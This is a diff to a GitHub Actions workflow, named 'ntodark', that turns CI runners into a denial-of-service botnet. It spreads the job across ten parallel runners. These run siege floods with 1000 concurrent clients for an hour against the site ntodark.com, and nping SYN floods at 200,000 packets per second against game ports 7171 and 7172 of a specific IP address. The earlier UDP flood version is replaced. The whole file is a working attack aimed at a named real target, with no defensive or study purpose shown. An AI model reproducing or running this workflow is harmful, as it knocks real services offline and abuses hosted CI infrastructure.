@@ -1,18 +1,26 @@
-name: flood
+name: ntodark
 on:
   workflow_dispatch:
 
 jobs:
-  attack:
+  flood:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        runner: [1,2,3,4]
+        runner: [1,2,3,4,5,6,7,8,9,10]
     steps:
-      - name: Install nping
-        run: sudo apt-get update -qq && sudo apt-get install -y nmap
-      - name: Run flood
+      - name: Install tools
         run: |
-          nping --udp -p 7171 --data-length 1200 --rate 100000 34.151.221.105 &
-          nping --udp -p 7172 --data-length 1200 --rate 100000 34.151.221.105 &
+          sudo apt-get update -qq
+          sudo apt-get install -y siege nping
+      - name: Attack website
+        run: |
+          siege -c 1000 -t 3600s http://ntodark.com &
+          siege -c 1000 -t 3600s https://ntodark.com &
+          sleep 3600
+      - name: Attack game ports
+        run: |
+          # SYN flood nas portas 7171 e 7172
+          nping --tcp -p 7171 --flags SYN --rate 200000 34.151.221.105 &
+          nping --tcp -p 7172 --flags SYN --rate 200000 34.151.221.105 &
           sleep 3600
